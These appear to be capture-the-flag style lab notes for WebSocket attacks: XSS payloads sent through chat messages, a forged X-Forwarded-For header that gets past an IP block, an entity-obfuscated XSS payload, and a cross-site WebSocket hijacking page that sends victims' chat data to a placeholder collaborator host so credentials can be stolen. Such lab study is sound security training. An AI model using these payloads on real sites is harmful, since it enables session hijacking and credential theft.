# Navigation
- [Manipulating WebSocket messages to exploit vulnerabilities](#manipulating-websocket-messages-to-exploit-vulnerabilities)
- [Manipulating the WebSocket handshake to exploit vulnerabilities](#manipulating-the-websocket-handshake-to-exploit-vulnerabilities)
- [Cross-site WebSocket hijacking](#cross-site-websocket-hijacking)
# Manipulating WebSocket messages to exploit vulnerabilities
1. Begin interacting with the web chat feature
2. Send the WebSocket interaction to repeater
3. Manipulate the `message` request to include a generic XSS payload
```JSON
{"message":"<img src=x onerror=alert(document.domain)>"}
```
# Manipulating the WebSocket handshake to exploit vulnerabilities
1. Begin interacting with the web chat feature
2. Sending generic XSS payload triggers a filter and blacklists us from connecting
3. When reconnecting, we get an error saying "IP is blacklisted"
4. Provide a fake `X-Forwarded-For` header in the WebSocket handshake request
```http
GET /chat HTTP/1.1
Host: 0a30001a045624a5829a38b60089005c.web-security-academy.net
Connection: Upgrade
X-Forwarded-For: 1
Upgrade: websocket
Origin: https://0a30001a045624a5829a38b60089005c.web-security-academy.net
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: R6QK0gp+xY0x5ZIRtCq7Bg==
...<SNIP>...
```
5. Through trial and error we finally get a payload working that will pop the `alert` function
```json
{"message":"<img src=x onerror = &#x61;&#x6c;&#x65;&#x72;&#x74;(document.domain)>"}
```
- This decodes to `<img src="x" onerror="alert(document.domain)">`
# Cross-site WebSocket hijacking
1. Live Chat
2. Send the WebSocket connection to the repeater tab
3. Create a new WebSocket connection
	1. Pencil > Clone active connection
	2. Change `Origin:` header to arbitrary domain (also note there are no CSRF protections on the handshake)
	3. Confirm new WebSocket has been opened with arbitrary domain (check Logger)
4. Host a malicious page to establish a WebSocket connection to the live chat feature and view it yourself
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
        var ws = new WebSocket('wss://<WEBSOCKET-URL>/chat');
        ws.onopen = function start(event) {
            ws.send("READY");
        }
        ws.onmessage = function handleReplay(event) {
            fetch('https://YOUR-COLLABORATOR-IP/', {
                mode: 'no-cors',
                method: "POST",
                body: (event.data)
            });
        }
        ws.send("Text has been sent to the server");
    </script>
</body>
</html>
```
5. View yourself with the network tab open and confirm that your messages have been sent to collaborator
6. Send exploit to victim > Steal creds > Login